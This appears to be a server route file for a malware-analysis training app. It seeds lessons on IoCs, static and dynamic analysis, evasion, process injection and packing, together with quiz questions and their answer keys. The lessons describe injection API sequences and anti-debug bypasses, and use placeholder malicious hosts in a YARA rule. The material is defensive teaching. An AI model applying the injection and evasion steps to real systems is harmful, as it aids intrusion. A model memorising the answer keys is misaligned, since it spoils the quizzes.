import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  app.get(api.lessons.list.path, async (req, res) => {
    const lessons = await storage.getLessons();
    res.json(lessons);
  });

  app.get(api.lessons.get.path, async (req, res) => {
    const lesson = await storage.getLesson(Number(req.params.id));
    if (!lesson) return res.status(404).json({ message: 'Lesson not found' });
    res.json(lesson);
  });

  app.get(api.quizzes.listByLesson.path, async (req, res) => {
    const quizzes = await storage.getQuizzesByLesson(Number(req.params.id));
    res.json(quizzes);
  });

  app.get(api.challenges.list.path, async (req, res) => {
    const challenges = await storage.getChallenges();
    res.json(challenges);
  });

  app.get(api.challenges.get.path, async (req, res) => {
    const challenge = await storage.getChallenge(Number(req.params.id));
    if (!challenge) return res.status(404).json({ message: 'Challenge not found' });
    res.json(challenge);
  });

  app.post(api.challenges.submit.path, async (req, res) => {
    const challenge = await storage.getChallenge(Number(req.params.id));
    if (!challenge) return res.status(404).json({ message: 'Challenge not found' });
    const { flag } = req.body;
    if (!flag || typeof flag !== 'string') return res.status(400).json({ message: 'Flag is required' });
    const isCorrect = flag.trim().toLowerCase() === challenge.flag.toLowerCase();
    if (isCorrect) {
      await storage.updateProgress('anonymous-user', 'challenge', challenge.id);
    }
    res.json({
      correct: isCorrect,
      message: isCorrect ? 'Flag captured! Great job.' : 'Incorrect flag. Try again.'
    });
  });

  app.get(api.progress.list.path, async (req, res) => {
    const progress = await storage.getProgress('anonymous-user');
    res.json(progress);
  });

  app.post(api.progress.update.path, async (req, res) => {
    const { resourceType, resourceId } = req.body;
    if (!resourceType || !['lesson', 'challenge'].includes(resourceType)) {
      return res.status(400).json({ message: 'resourceType must be "lesson" or "challenge"' });
    }
    if (!resourceId || typeof resourceId !== 'number') {
      return res.status(400).json({ message: 'resourceId must be a number' });
    }
    const update = await storage.updateProgress('anonymous-user', resourceType, resourceId);
    res.json(update);
  });

  app.get(api.quizAnswers.getByLesson.path, async (req, res) => {
    const lessonId = Number(req.params.id);
    const answers = await storage.getQuizAnswers('anonymous-user', lessonId);
    res.json(answers);
  });

  app.post(api.quizAnswers.submit.path, async (req, res) => {
    const lessonId = Number(req.params.id);
    const { quizId, selectedAnswer, isCorrect } = req.body;
    if (quizId === undefined || selectedAnswer === undefined || isCorrect === undefined) {
      return res.status(400).json({ message: 'quizId, selectedAnswer, and isCorrect are required' });
    }

    const answer = await storage.saveQuizAnswer('anonymous-user', quizId, lessonId, selectedAnswer, isCorrect);

    const allQuizzes = await storage.getQuizzesByLesson(lessonId);
    const allAnswers = await storage.getQuizAnswers('anonymous-user', lessonId);
    const allAnswered = allQuizzes.length > 0 && allAnswers.length >= allQuizzes.length;

    let lessonCompleted = false;
    if (allAnswered) {
      await storage.updateProgress('anonymous-user', 'lesson', lessonId);
      lessonCompleted = true;
    }

    res.json({ answer, allAnswered, lessonCompleted });
  });

  async function seed() {
    const existingLessons = await storage.getLessons();
    if (existingLessons.length > 0) return;
    console.log("Seeding database...");

    // ============ MODULE 1 ============
    const m1 = await storage.createLesson({
      title: "01. Why Malware Analysis?",
      slug: "why-malware-analysis",
      category: "foundations",
      difficulty: "Beginner",
      order: 1,
      content: `> **CORE CONCEPT** — This module covers prerequisite knowledge needed before attempting the CTF challenges. Make sure you understand these fundamentals before proceeding to the hands-on exercises.

# Why Malware Analysis?

Malware analysis is a **systematic approach** to identify and understand malicious software. It is one of the most critical skills in cybersecurity.

## Primary Objectives
- **Fingerprint malware** \u2014 Uniquely identify a sample via cryptographic hashes (MD5, SHA-1, SHA-256).
- **Understand functionality** \u2014 What does the code actually do? Does it steal credentials? Encrypt files? Open a backdoor?
- **Determine/contain damages** \u2014 Assess the blast radius. What systems were compromised? What data was exfiltrated?
- **Find out how it got there** \u2014 Identify the initial access vector (phishing email, exploit kit, supply chain compromise).
- **Create rules and signatures** \u2014 Write YARA rules, Snort/Suricata signatures, and firewall blocklists.

## Use Cases in the Real World

| Role | How They Use Analysis |
|---|---|
| **Malware Researcher** | Discovers new families, documents TTPs |
| **Threat Intelligence Analyst** | Attributes campaigns to threat actors |
| **Incident Responder** | Contains active breaches, identifies scope |
| **SOC Analyst** | Triages alerts, confirms true positives |

## Indicators of Compromise (IoCs)
IoCs are forensic artifacts observed on a network or host that indicate a security breach. Collecting IoCs is one of the most important outputs of malware analysis.

Think of IoCs as the **fingerprints left at a crime scene**. They allow defenders to detect the same threat across an entire organization.

![Malware Analysis Workflow](/images/diagram-analysis-workflow.png)

---

## Further Reading
- [MITRE ATT&CK Framework](https://attack.mitre.org/) — Comprehensive knowledge base of adversary tactics and techniques
- [NIST SP 800-83: Guide to Malware Incident Prevention](https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final) — Official NIST guidelines
- [SANS Malware Analysis Cheat Sheet](https://www.sans.org/posters/malware-analysis-cheat-sheet/) — Quick reference poster
- [VirusTotal](https://www.virustotal.com/) — Free online malware scanning and analysis service
`
    });

    await storage.createQuiz({ lessonId: m1.id, question: "What is the primary purpose of collecting Indicators of Compromise (IoCs)?", options: ["To delete malware automatically from all systems", "To create detection rules and block malicious infrastructure across the organization", "To reverse the encryption applied by ransomware", "To identify the developer's real name"], correctAnswer: 1, explanation: "IoCs like IP addresses, domains, file hashes, and behavioral patterns are collected specifically to create detection signatures (YARA rules, firewall blocks, IDS rules) that can be deployed organization-wide." });
    await storage.createQuiz({ lessonId: m1.id, question: "Which role would primarily use malware analysis to attribute a campaign to a specific threat actor group (e.g., APT28)?", options: ["SOC Analyst", "System Administrator", "Threat Intelligence Analyst", "Network Engineer"], correctAnswer: 2, explanation: "Threat Intelligence Analysts focus on attribution, tracking campaigns over time, and linking TTPs to known threat actor groups." });

    // ============ MODULE 2 ============
    const m2 = await storage.createLesson({
      title: "02. IoC Categories Deep Dive",
      slug: "ioc-categories",
      category: "foundations",
      difficulty: "Beginner",
      order: 2,
      content: `> **CORE CONCEPT** — This module covers prerequisite knowledge needed before attempting the CTF challenges. Make sure you understand these fundamentals before proceeding to the hands-on exercises.

# IoC Categories for Malware

Understanding **where to look** is half the battle. IoCs fall into four major categories.

## 1. Network-based IoCs
These are artifacts observed in network traffic.
- **IP addresses** \u2014 C2 (Command & Control) servers, drop sites, exfiltration endpoints.
- **Domains / subdomains** \u2014 Often generated by DGA (Domain Generation Algorithms).
- **URLs and URI paths** \u2014 Specific callback paths like \`/gate.php\` or \`/panel/login\`.
- **JA3 / TLS fingerprints** \u2014 Unique hashes of TLS client hello parameters. Great for identifying malware families even when IPs rotate.
- **DNS patterns** \u2014 Fast-flux DNS, unusually high query rates.
- **HTTP headers & User-Agents** \u2014 Malware often has hardcoded or unusual User-Agent strings.

## 2. Host-based IoCs
Artifacts found on the infected machine.
- **File hashes** (MD5, SHA-1, SHA-256) \u2014 The most common IoC type.
- **File names and paths** \u2014 e.g., \`C:\\Users\\Public\\svchost.exe\` (legitimate svchost lives in System32).
- **Registry keys / values** \u2014 Persistence via \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`.
- **Scheduled tasks / cron jobs** \u2014 Another persistence mechanism.
- **Services and drivers** \u2014 Rootkits often install kernel-mode drivers.
- **Mutexes** \u2014 Named mutexes used to prevent multiple instances from running.
- **Prefetch files** \u2014 Evidence of execution on Windows (\`C:\\Windows\\Prefetch\\*.pf\`).

## 3. File / Static IoCs
Artifacts extracted from the binary without running it.
- **Magic bytes** \u2014 First bytes identify file type (\`MZ\` = PE, \`7F 45 4C 46\` = ELF).
- **PE section names** \u2014 Unusual names like \`.UPX0\`, \`.themida\` indicate packing.
- **Compile timestamp** \u2014 Can indicate build environment (but easily forged).
- **Import table / API usage** \u2014 Which Windows APIs does it call?
- **PDB paths** \u2014 Debug paths accidentally left in the binary (e.g., \`C:\\Users\\attacker\\Desktop\\mal\\Release\\trojan.pdb\`).
- **YARA rule matches** \u2014 Pattern-based detection.

## 4. Behavioral IoCs
Observed by running the malware.
- **Process injection** \u2014 Injecting code into \`explorer.exe\`, \`svchost.exe\`.
- **Persistence mechanisms** \u2014 Registry Run keys, startup folders, WMI subscriptions.
- **Privilege escalation** \u2014 Attempting to gain SYSTEM or root.
- **Lateral movement** \u2014 PSExec, WMI, SMB spreading.
- **Anti-analysis behavior** \u2014 Checking for debuggers, VMs, sandboxes.

---

## Further Reading
- [MITRE ATT&CK: Indicator Types](https://attack.mitre.org/techniques/T1071/) — Network-based indicator techniques
- [STIX/TAXII Standards (OASIS)](https://oasis-open.github.io/cti-documentation/) — Structured Threat Information Expression for sharing IoCs
- [OpenIOC Framework](https://www.mandiant.com/resources/blog/openioc-basics) — Mandiant\u2019s open framework for sharing IoCs
- [AlienVault OTX](https://otx.alienvault.com/) — Open Threat Exchange community platform
`
    });

    await storage.createQuiz({ lessonId: m2.id, question: "A malware sample creates a named object called 'Global\\\\MUTEX_UPDATE_SVC'. What type of IoC is this?", options: ["Network-based IoC", "File/Static IoC", "Host-based IoC (Mutex)", "Behavioral IoC"], correctAnswer: 2, explanation: "Mutexes are host-based IoCs. Malware uses named mutexes to ensure only one instance runs on a system. Finding a unique mutex name is a strong indicator and useful for detection rules." });
    await storage.createQuiz({ lessonId: m2.id, question: "You find the string 'C:\\\\Users\\\\dev\\\\projects\\\\stealer\\\\Release\\\\payload.pdb' in a binary. What type of IoC is this?", options: ["Network-based IoC", "PDB Path (File/Static IoC)", "Behavioral IoC", "Registry IoC"], correctAnswer: 1, explanation: "PDB (Program Database) paths are debug information accidentally left in compiled binaries. They can reveal the attacker's development environment, username, and project structure." });

    // ============ MODULE 3 ============
    const m3 = await storage.createLesson({
      title: "03. Malware Taxonomy",
      slug: "malware-taxonomy",
      category: "foundations",
      difficulty: "Beginner",
      order: 3,
      content: `> **CORE CONCEPT** — This module covers prerequisite knowledge needed before attempting the CTF challenges. Make sure you understand these fundamentals before proceeding to the hands-on exercises.

# Types of Malware

Knowing the \"species\" helps predict behavior and guides your analysis approach.

## Propagation-based
- **Virus** \u2014 Attaches to legitimate files and spreads when the file is executed by a user. Requires human interaction.
- **Worm** \u2014 Self-replicates automatically across networks without user interaction (e.g., WannaCry via EternalBlue).

## Deception-based
- **Trojan** \u2014 Disguises itself as legitimate software. The user installs it voluntarily.
- **Dropper** \u2014 Delivers and installs other malware while hiding the original payload.
- **Downloader** \u2014 Fetches and installs additional payloads from a remote server.

## Impact-based
- **Ransomware** \u2014 Encrypts files and demands payment (e.g., LockBit, Conti).
- **Wiper** \u2014 Destroys data permanently. No ransom. Pure destruction (e.g., NotPetya, WhisperGate).
- **Cryptominer** \u2014 Hijacks CPU/GPU to mine cryptocurrency.

## Stealth-based
- **Rootkit** \u2014 Hides deep in the OS (kernel-mode) to provide persistent, stealthy access.
- **Backdoor** \u2014 Creates hidden access bypassing authentication.
- **Fileless Malware** \u2014 Lives entirely in memory using LOLBins (Living Off the Land Binaries) like PowerShell, WMI, \`mshta.exe\`, \`regsvr32.exe\`.

## Surveillance-based
- **Spyware** \u2014 Monitors user activity, captures screenshots, accesses camera/mic.
- **Keylogger** \u2014 Records keystrokes to capture passwords.
- **Botnet Malware** \u2014 Turns infected machines into remotely controlled bots for DDoS, spam, or credential stuffing.

## Conditional
- **Logic Bomb** \u2014 Activates when a condition is met (date, event, user action).
- **Scareware** \u2014 Uses fake alerts to trick users into installing malware or paying for fake AV.

![Malware Taxonomy Classification](/images/diagram-malware-taxonomy.png)

---

## Further Reading
- [MITRE ATT&CK Software List](https://attack.mitre.org/software/) — Catalog of known malware families and their TTPs
- [ENISA Threat Landscape Report](https://www.enisa.europa.eu/topics/threat-risk-management/threats-and-trends) — Annual European threat landscape analysis
- [CISA Malware Analysis Reports](https://www.cisa.gov/news-events/cybersecurity-advisories) — US government malware advisories
- [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/) — Fraunhofer FKIE malware encyclopedia
`
    });

    await storage.createQuiz({ lessonId: m3.id, question: "What distinguishes a Worm from a Virus?", options: ["Worms are less dangerous", "Worms self-replicate without user interaction; viruses require a user to execute the infected file", "Viruses can spread over networks; worms cannot", "There is no difference"], correctAnswer: 1, explanation: "The key distinction is propagation method. Viruses attach to files and require user action (opening a file). Worms exploit vulnerabilities to spread autonomously across networks." });
    await storage.createQuiz({ lessonId: m3.id, question: "NotPetya is classified as which type of malware?", options: ["Ransomware (it demands payment)", "Wiper (it destroys data with no intent to decrypt)", "Adware", "Keylogger"], correctAnswer: 1, explanation: "While NotPetya initially appeared to be ransomware, analysis revealed it was actually a wiper. The encryption was irreversible by design \u2014 there was no real decryption mechanism, making it purely destructive." });

    // ============ MODULE 4 ============
    const m4 = await storage.createLesson({
      title: "05. Static Analysis Methodology",
      slug: "static-analysis",
      category: "static",
      difficulty: "Intermediate",
      order: 5,
      content: `# Static Analysis Methodology

Static analysis examines malware **without executing it**. This is the safest first step.

## Step 1: Target Architecture
Determine the platform:
- **PE (Portable Executable)** \u2014 Windows (\`.exe\`, \`.dll\`, \`.sys\`)
- **ELF** \u2014 Linux
- **Mach-O** \u2014 macOS
- **APK/DEX** \u2014 Android

Use the \`file\` command on Linux:
\`\`\`bash
$ file suspicious.exe
suspicious.exe: PE32 executable (GUI) Intel 80386, for MS Windows
\`\`\`

## Step 2: Fingerprinting
Generate cryptographic hashes for identification:
\`\`\`bash
$ md5sum suspicious.exe
d41d8cd98f00b204e9800998ecf8427e  suspicious.exe

$ sha256sum suspicious.exe
e3b0c44298fc1c149afbf4c8996fb924...  suspicious.exe
\`\`\`
Submit hashes to **VirusTotal**, **MalwareBazaar**, or **Hybrid Analysis** to check if the sample is already known.

## Step 3: Strings Extraction
\`\`\`bash
$ strings -n 8 suspicious.exe | head -20
kernel32.dll
http://evil-server.com/gate.php
Mozilla/5.0 (Windows NT 10.0)
RegSetValueExA
CreateRemoteThread
\`\`\`

Look for: URLs, IPs, file paths, API names, error messages, registry keys.

## Step 4: PE Header Analysis
Tools: **PE-bear**, **CFF Explorer**, **pefile (Python)**
- Check the **Import Address Table (IAT)** for suspicious APIs.
- Examine **section entropy** (>7.0 suggests packing/encryption).
- Look at the **compile timestamp** and **subsystem** type.

## Step 5: YARA Rules
Write custom rules to detect the sample:
\`\`\`
rule Suspicious_Backdoor {
    strings:
        $url = "http://evil-server.com"
        $api1 = "CreateRemoteThread"
        $api2 = "WriteProcessMemory"
    condition:
        uint16(0) == 0x5A4D and all of them
}
\`\`\`

![PE File Structure](/images/diagram-pe-structure.png)

---

## Further Reading
- [Microsoft PE Format Documentation](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) — Official PE specification
- [YARA Documentation](https://yara.readthedocs.io/en/stable/) — Official YARA rule writing guide
- [PE-bear (GitHub)](https://github.com/hasherezade/pe-bear) — PE file analysis tool
- [pefile Python Library](https://github.com/erocarrera/pefile) — Python module for PE parsing
- [VirusTotal YARA](https://docs.virustotal.com/docs/yara) — Using YARA with VirusTotal
`
    });

    await storage.createQuiz({ lessonId: m4.id, question: "You run 'strings' on a PE file and find 'CreateRemoteThread' and 'WriteProcessMemory'. What technique does this suggest?", options: ["File encryption", "Process injection", "Network scanning", "Disk wiping"], correctAnswer: 1, explanation: "CreateRemoteThread and WriteProcessMemory are the classic API pair used for process injection. The malware allocates memory in a target process, writes its code there, then creates a remote thread to execute it." });
    await storage.createQuiz({ lessonId: m4.id, question: "What does the YARA condition 'uint16(0) == 0x5A4D' check for?", options: ["The file size is exactly 0x5A4D bytes", "The file starts with 'MZ' (a Windows PE executable)", "The file contains the string '5A4D'", "The file has exactly two sections"], correctAnswer: 1, explanation: "0x5A4D is the little-endian representation of 'MZ', the magic bytes that start every PE (Portable Executable) file. This condition ensures the YARA rule only matches Windows executables." });

    // ============ MODULE 5 ============
    const m5 = await storage.createLesson({
      title: "06. Dynamic Analysis Methodology",
      slug: "dynamic-analysis",
      category: "dynamic",
      difficulty: "Intermediate",
      order: 6,
      content: `# Dynamic Analysis Methodology

Dynamic analysis means **running the malware** in a controlled environment and observing its behavior.

## What to Monitor
- **Registry keys** \u2014 Created, changed, or destroyed. Check for persistence in Run/RunOnce keys.
- **Processes** \u2014 Created, suspended, killed. Watch for process injection into legitimate processes.
- **Files** \u2014 Dropped, deleted, created, encrypted. Look for second-stage payloads.
- **Users** \u2014 Added, changed, deleted. Some malware creates hidden admin accounts.
- **Network** \u2014 DNS queries, HTTP/HTTPS callbacks, C2 communication patterns.
- **APIs called** \u2014 Use API monitoring to track system calls in real time.

## Essential Tools

| Tool | Purpose |
|---|---|
| **Procmon** (Sysinternals) | File system, registry, process, and network activity |
| **Process Hacker** | Real-time process monitoring, memory inspection |
| **Wireshark** | Full packet capture and protocol analysis |
| **Regshot** | Registry snapshot diff (before/after execution) |
| **FakeNet-NG** | Simulates network services to capture C2 traffic |
| **API Monitor** | Hooks and logs Windows API calls |

## Execution Strategy
1. Take a **clean VM snapshot**.
2. Start all monitoring tools.
3. Execute the malware.
4. Wait 5-10 minutes (some malware has sleep timers).
5. Interact with the system (move mouse, open apps) \u2014 some malware waits for user activity.
6. Capture all logs and network traffic.
7. **Revert to snapshot** when done.

---

## Further Reading
- [Sysinternals Suite (Microsoft)](https://learn.microsoft.com/en-us/sysinternals/) — Process Monitor, Process Explorer, and more
- [Wireshark Documentation](https://www.wireshark.org/docs/) — Network protocol analyzer
- [FakeNet-NG (Mandiant)](https://github.com/mandiant/flare-fakenet-ng) — Dynamic network analysis tool
- [Any.Run Interactive Sandbox](https://any.run/) — Interactive malware analysis sandbox
- [MITRE ATT&CK: Execution](https://attack.mitre.org/tactics/TA0002/) — Execution techniques taxonomy
`
    });

    await storage.createQuiz({ lessonId: m5.id, question: "Why should you wait several minutes after executing malware in a sandbox before collecting results?", options: ["The malware needs time to install properly", "Some malware implements sleep timers or waits for specific conditions before activating", "The monitoring tools need time to initialize", "Windows needs time to update its virus definitions"], correctAnswer: 1, explanation: "Many malware families implement sleep timers (sometimes minutes, sometimes hours) or wait for specific conditions (user interaction, time of day, network connectivity) as anti-sandbox evasion techniques. Rushing the analysis may miss the malicious behavior entirely." });
    await storage.createQuiz({ lessonId: m5.id, question: "What tool would you use to compare the Windows Registry before and after malware execution?", options: ["Wireshark", "Process Hacker", "Regshot", "strings"], correctAnswer: 2, explanation: "Regshot takes snapshots of the entire Windows Registry at two points in time and generates a diff report showing all keys/values that were created, modified, or deleted. This is essential for identifying persistence mechanisms." });

    // ============ MODULE 6 ============
    const m6 = await storage.createLesson({
      title: "07. Anti-Analysis & Evasion Techniques",
      slug: "anti-analysis",
      category: "dynamic",
      difficulty: "Advanced",
      order: 7,
      content: `# Anti-Analysis & Evasion Techniques

Modern malware actively fights back against analysts. Understanding evasion is critical for both offense and defense.

## Anti-Debugging
- **IsDebuggerPresent** \u2014 Simple API check. Returns TRUE if a debugger is attached.
- **NtQueryInformationProcess** \u2014 Checks \`ProcessDebugPort\` and \`ProcessDebugFlags\`.
- **Timing checks** \u2014 Uses \`rdtsc\`, \`GetTickCount\`, or \`QueryPerformanceCounter\` to detect if execution is being slowed by single-stepping in a debugger.
- **INT 2D / INT 3** \u2014 Debug interrupts that behave differently under a debugger.
- **Hardware breakpoint detection** \u2014 Reading debug registers (DR0-DR7) via \`GetThreadContext\`.

## Anti-VM / Anti-Sandbox
- **CPUID checks** \u2014 Hypervisor bit in CPUID leaf 1 ECX.
- **Registry artifacts** \u2014 Checking for \`HKLM\\SOFTWARE\\VMware, Inc.\` or VirtualBox guest additions.
- **MAC address prefixes** \u2014 \`00:05:69\` (VMware), \`08:00:27\` (VirtualBox).
- **Process names** \u2014 Looking for \`vmtoolsd.exe\`, \`VBoxService.exe\`, \`procmon.exe\`.
- **Low resource counts** \u2014 < 2 CPU cores, < 4GB RAM, < 80GB disk = probably a VM.
- **Username/hostname** \u2014 Checking for common sandbox names like "sandbox", "malware", "virus".

## Anti-Disassembly
- **Opaque predicates** \u2014 Fake conditional jumps that always go one way but confuse disassemblers.
- **Junk code insertion** \u2014 Dead code that makes analysis tedious.
- **Control flow flattening** \u2014 Transforms the CFG into a dispatcher loop, making it very hard to follow logic.

## Bypassing These Techniques
As an analyst, you can:
1. **Patch the binary** \u2014 NOP out checks (change \`JNZ\` to \`JZ\` or \`NOP\`).
2. **Set breakpoints past the check** \u2014 Let the check execute, then modify the result.
3. **Use ScyllaHide** \u2014 An anti-anti-debug plugin for x64dbg/OllyDbg.
4. **Modify VM artifacts** \u2014 Remove VMware tools, change MAC address, increase resources.

![Anti-Analysis Evasion Techniques](/images/diagram-anti-analysis.png)

---

## Further Reading
- [MITRE ATT&CK: Defense Evasion](https://attack.mitre.org/tactics/TA0005/) — Catalog of evasion techniques
- [ScyllaHide (GitHub)](https://github.com/x64dbg/ScyllaHide) — Anti-anti-debug plugin for x64dbg
- [al-khaser (GitHub)](https://github.com/LordNoteworthy/al-khaser) — Tool demonstrating anti-VM/debug techniques
- [CheckPoint Research: Evasion Techniques](https://research.checkpoint.com/) — Latest evasion technique research
- [Unprotect Project](https://unprotect.it/) — Database of malware evasion techniques
`
    });

    await storage.createQuiz({ lessonId: m6.id, question: "Malware checks the MAC address prefix '00:05:69'. What is it trying to detect?", options: ["A real corporate network", "A VMware virtual machine", "A Tor exit node", "A cloud server"], correctAnswer: 1, explanation: "00:05:69 is a MAC address prefix (OUI) assigned to VMware. Malware checks for this to determine if it's running inside a VMware VM, which likely means it's being analyzed in a sandbox." });
    await storage.createQuiz({ lessonId: m6.id, question: "How would you bypass an 'IsDebuggerPresent' anti-debugging check in x64dbg?", options: ["Delete the malware and start over", "Patch the JNZ instruction after the check to JZ or NOP it out", "Run the malware without a debugger", "Change the malware's file extension"], correctAnswer: 1, explanation: "The standard technique is to patch the conditional jump (JNZ/JE) that follows the IsDebuggerPresent call. By changing JNZ to JZ (or NOP-ing the instruction), the malware takes the 'not debugged' code path regardless of the actual result." });

    // ============ MODULE 7 ============
    const m7 = await storage.createLesson({
      title: "08. Process Injection Techniques",
      slug: "process-injection",
      category: "advanced",
      difficulty: "Advanced",
      order: 8,
      content: `# Process Injection Techniques

Process injection allows malware to execute code within the address space of another (legitimate) process. This is a core technique for defense evasion.

## Classic DLL Injection
1. \`OpenProcess\` \u2014 Get a handle to the target process.
2. \`VirtualAllocEx\` \u2014 Allocate memory in the target.
3. \`WriteProcessMemory\` \u2014 Write the DLL path into allocated memory.
4. \`CreateRemoteThread\` \u2014 Create a thread in the target that calls \`LoadLibrary\` with the DLL path.

## Process Hollowing (RunPE)
1. \`CreateProcess\` with \`CREATE_SUSPENDED\` flag.
2. \`NtUnmapViewOfSection\` \u2014 Hollow out the legitimate code.
3. \`VirtualAllocEx\` + \`WriteProcessMemory\` \u2014 Write malicious PE into the hollowed space.
4. \`SetThreadContext\` \u2014 Update the entry point.
5. \`ResumeThread\` \u2014 Execute the malicious code under the guise of the legitimate process.

## APC Injection (Early Bird)
- Queue an Asynchronous Procedure Call (APC) to a thread in an alertable state.
- The "Early Bird" variant injects into a process before it fully initializes, evading many hooks.

## Reflective DLL Injection
- The DLL loads itself into memory without using \`LoadLibrary\`, bypassing API monitoring.
- Uses a custom loader stub embedded in the DLL.

## Detection Indicators
- Legitimate processes (like \`notepad.exe\`) making network connections.
- Memory sections with RWX (Read-Write-Execute) permissions.
- Threads in a process with start addresses outside any loaded module.
- Parent-child process relationship anomalies (e.g., \`Word.exe\` spawning \`cmd.exe\`).

![Process Injection Techniques](/images/diagram-process-injection.png)

---

## Further Reading
- [MITRE ATT&CK T1055: Process Injection](https://attack.mitre.org/techniques/T1055/) — All sub-techniques of process injection
- [Elastic Security: Ten Process Injection Techniques](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) — Technical survey
- [Red Canary: Process Injection](https://redcanary.com/threat-detection-report/techniques/process-injection/) — Detection strategies
`
    });

    await storage.createQuiz({ lessonId: m7.id, question: "In a Process Hollowing attack, why is the target process created with the CREATE_SUSPENDED flag?", options: ["To make it run faster", "To prevent the legitimate code from executing before it can be replaced with malicious code", "To hide the process from Task Manager", "To encrypt the process memory"], correctAnswer: 1, explanation: "CREATE_SUSPENDED prevents the main thread from executing. This gives the malware time to unmap the original executable image and replace it with its own code before resuming the thread, making it appear as the legitimate process." });
    await storage.createQuiz({ lessonId: m7.id, question: "You see 'notepad.exe' making outbound connections to a suspicious IP on port 443. What might this indicate?", options: ["Notepad has an update feature", "Process injection \u2014 malware injected code into notepad.exe to use it as a communication proxy", "The user is browsing the web", "A Windows system update is occurring"], correctAnswer: 1, explanation: "Notepad.exe should never make network connections. This is a classic indicator of process injection, where malware has injected its C2 communication code into a benign process to disguise its network traffic." });

    // ============ MODULE 8 ============
    const m8 = await storage.createLesson({
      title: "04. Setting Up the Analysis Lab",
      slug: "lab-setup",
      category: "practical",
      difficulty: "Beginner",
      order: 4,
      content: `# Creating a Safe Analysis Lab

**NEVER analyze malware on your host machine or a machine connected to a production network.**

## Recommended Virtual Machines

### Windows: Flare VM
[https://github.com/mandiant/flare-vm](https://github.com/mandiant/flare-vm)
- A Windows-based security distribution by Mandiant.
- Pre-installed with: x64dbg, IDA Free, Ghidra, PE-bear, YARA, Python, and 100+ tools.
- Install on a clean Windows 10/11 VM.

### Linux: REMnux
[https://docs.remnux.org/](https://docs.remnux.org/)
- A Linux distribution for reverse engineering and malware analysis.
- Includes: radare2, Ghidra, YARA, Volatility, olevba, and network analysis tools.

## Critical Isolation Rules
1. **Network**: Host-only adapter or fully disconnected. **Never use NAT or Bridged**.
2. **Clipboard**: Disable copy/paste between host and VM.
3. **Shared Folders**: Disable all shared folders.
4. **Drag & Drop**: Disable drag and drop.
5. **Snapshots**: Take a clean snapshot BEFORE detonating any sample.

## Online Sandbox Services
If you can't set up a local lab:
- [Any.Run](https://any.run) \u2014 Interactive sandbox, you control the mouse/keyboard.
- [Hybrid Analysis](https://hybrid-analysis.com/) \u2014 Free automated analysis.

## Getting Malware Samples
- [MalwareBazaar](https://bazaar.abuse.ch) \u2014 Community-driven repository.
- [vx-underground](https://vx-underground.org/) \u2014 Massive collection + papers.
- [theZoo](https://github.com/ytisf/theZoo) \u2014 GitHub-hosted malware repository (for research).

---

## Further Reading
- [FLARE VM (Mandiant GitHub)](https://github.com/mandiant/flare-vm) — Windows analysis VM setup
- [REMnux Documentation](https://docs.remnux.org/) — Linux analysis distribution
- [MalwareBazaar](https://bazaar.abuse.ch/) — Community-driven malware sample repository
- [SANS FOR610: Reverse Engineering Malware](https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/) — Professional training course
`
    });

    await storage.createQuiz({ lessonId: m8.id, question: "What network adapter setting should your analysis VM use?", options: ["NAT (Network Address Translation)", "Bridged (connected to your real network)", "Host-only or fully disconnected", "Wi-Fi direct"], correctAnswer: 2, explanation: "Host-only networking ensures the VM can only communicate with the host (if needed) but has NO access to the internet or your local network. This prevents malware from spreading, contacting real C2 servers, or exfiltrating data from your network." });

    // ============ MODULE 9 ============
    const m9 = await storage.createLesson({
      title: "09. Obfuscation & Packing",
      slug: "obfuscation-packing",
      category: "static",
      difficulty: "Intermediate",
      order: 9,
      content: `# Obfuscation & Packing

Malware authors use obfuscation and packing to make analysis harder and evade signature-based detection.

## String Obfuscation
- **Base64 encoding** \u2014 Easy to spot and decode. Look for strings ending in \`=\` or \`==\`.
- **XOR encryption** \u2014 Each byte XOR'd with a key. Reversible: \`plaintext = ciphertext XOR key\`.
- **Stack strings** \u2014 Characters pushed onto the stack one by one, assembled at runtime.
- **RC4 / AES encryption** \u2014 More sophisticated. Key may be hardcoded or derived.

## XOR Encryption Example
\`\`\`
Original: "http://evil.com"
Key:      0x41
Result:   Each byte XOR'd with 0x41

To decrypt: XOR each byte of the result with 0x41 again.
XOR is its own inverse: A XOR K XOR K = A
\`\`\`

## Packers
Packers compress and/or encrypt the executable. The real code is decompressed at runtime.
- **UPX** \u2014 Most common. Easy to unpack: \`upx -d packed.exe\`.
- **Themida / VMProtect** \u2014 Commercial protectors. Very hard to unpack.
- **Custom packers** \u2014 Written by the malware author. Require manual unpacking.

## Identifying Packed Binaries
- **High entropy** in sections (>7.0).
- **Very few imports** \u2014 Only \`LoadLibrary\` and \`GetProcAddress\`.
- **Section names** like \`.UPX0\`, \`.UPX1\`, \`.packed\`, \`.themida\`.
- **Large .rsrc section** \u2014 Payload may be hidden in resources.

## Manual Unpacking Strategy
1. Run the packed binary in a debugger.
2. Set a breakpoint on the **Original Entry Point (OEP)**.
3. Once the unpacker finishes, dump the process memory.
4. Fix the IAT (Import Address Table) using tools like **Scylla**.

---

## Further Reading
- [MITRE ATT&CK T1027: Obfuscated Files](https://attack.mitre.org/techniques/T1027/) — Obfuscation techniques taxonomy
- [UPX Official Documentation](https://upx.github.io/) — Popular PE packer
- [Detect It Easy (GitHub)](https://github.com/horsicq/Detect-It-Easy) — Packer/compiler detection tool
- [CyberChef (GCHQ)](https://gchq.github.io/CyberChef/) — Data transformation and decoding tool
`
    });

    await storage.createQuiz({ lessonId: m9.id, question: "A PE file has only 2 imports: LoadLibrary and GetProcAddress. What does this strongly suggest?", options: ["The file is a simple 'Hello World' program", "The file is packed and will resolve its real imports at runtime", "The file is a device driver", "The file is corrupted"], correctAnswer: 1, explanation: "Packed binaries typically import only LoadLibrary and GetProcAddress because the unpacking stub uses these two functions to dynamically resolve all other API calls at runtime after decompressing the real code." });
